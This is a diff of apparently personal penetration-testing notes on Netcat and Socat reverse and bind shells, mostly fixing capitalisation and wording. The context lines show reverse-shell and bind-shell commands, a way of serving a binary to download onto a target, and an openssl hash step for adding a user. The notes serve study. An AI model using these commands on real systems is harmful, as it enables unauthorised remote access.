@@ -2229,7 +2229,7 @@ Privilege Escalation
                 Netcat shells are very unstable (easy to lose) by default
 
             Socat
-                Socat shells are usually more stable than Netcat shells, it is vastly superior to netcat
+                Socat shells are usually more stable than Netcat shells, it is vastly superior to Netcat
                 The syntax is more difficult
                 Rarely installed
 
@@ -2361,15 +2361,15 @@ Privilege Escalation
 
             Technique 3: Socat
 
-                Limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell
+                Limited to Linux targets, as a Socat shell on Windows will be no more stable than a Netcat shell
 
-                Uses an initial Netcat shell as a stepping stone into a more fully-featured socat shell
+                Uses an initial Netcat shell as a stepping stone into a more fully-featured Socat shell
 
-                    We would first transfer a socat static compiled binary up to the target machine
+                    We would first transfer a Socat static compiled binary up to the target machine
                         A version of the program compiled to have no depencies
                             github.com/andrew-d/static-binaries
 
-                    On the attacking machine inside the directory containing your socat binary
+                    On the attacking machine inside the directory containing your Socat binary
                         sudo python3 -m http.server 80
 
                     On the target machine, using the Netcat shell to download the file
@@ -2381,14 +2381,14 @@ Privilege Escalation
 
         Socat
 
-            All socat does is provide a link between two points
+            All Socat does is provide a link between two points
 
 
             Reverse Shells
 
                 socat TCP-L:<lport> -
 
-                    As always with socat, this is taking two points
+                    As always with Socat, this is taking two points
                         (a listening port, and standard input) and connecting them together
 
                     The resulting shell is unstable, but this will work on either Linux or Windows
@@ -2421,7 +2421,7 @@ Privilege Escalation
 
 
             A fully stable tty reverse shell (tty stands for TeleTYpewriter)
-                The most powerful uses for socat, only work when the target is Linux
+                The most powerful uses for Socat, only work when the target is Linux
 
                     Listener syntax
 
@@ -2431,9 +2431,9 @@ Privilege Escalation
                                 Approximately equivalent to using the Netcat trick Ctrl + Z, stty raw -echo; fg
                                 With the added bonus of being immediately stable and hooking into a full tty
 
-                            This special listener must be activated with a very specific socat command
-                                This means that the target must have socat installed
-                                Most machines do not have socat installed (upload a precompiled socat binary)
+                            This special listener must be activated with a very specific Socat command
+                                This means that the target must have Socat installed
+                                Most machines do not have Socat installed (upload a precompiled Socat binary)
 
                     The specific command
 
@@ -2517,7 +2517,7 @@ Privilege Escalation
                     Bind        nc -lnvp <rport> -e /bin/bash
                     Reverse     nc <lhost> <lport> -e /bin/bash
 
-                However, this is not included in most versions of netcat as it is widely seen to be very insecure
+                However, this is not included in most versions of Netcat as it is widely seen to be very insecure
 
                     Bind Shell
 
@@ -2661,9 +2661,9 @@ Privilege Escalation
             Kali /usr/share/webshells
 
 
-        Next Steps
+        Next steps
 
-            Reverse and Bind shells are essential technique for gaining RCE on a machine
+            Reverse and Bind shells are an essential technique for gaining RCE on a machine
             However, they will never be as fully featured as a native shell
 
                 We always want to escalate into using a "normal" method for accessing the machine
@@ -2900,7 +2900,7 @@ Privilege Escalation
                         We will need the hash value of the password we want the user to have
                         This can be done quicky using the openssl tool on Kali Linux
 
-                            openssl passwd -1 -salt theName thePassword
+                            openssl passwd -1 -salt <name> <password>
 
                                 -1  MD5
                                 -5  SHA256
